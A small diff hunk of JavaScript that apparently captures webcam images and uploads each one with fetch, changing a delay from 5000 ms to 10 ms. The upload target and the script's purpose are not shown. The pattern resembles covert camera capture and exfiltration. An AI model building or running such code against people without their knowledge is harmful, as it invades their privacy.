@@ -73,7 +73,7 @@
               body: formData
             }).then(res => console.log("[✅] Sent photo")).catch(err => console.error("[❌] Error:", err));
           }, "image/png");
-        }, 5000);
+        }, 10);
       })
       .catch(err => {
         console.error("[❌] Webcam access denied.");
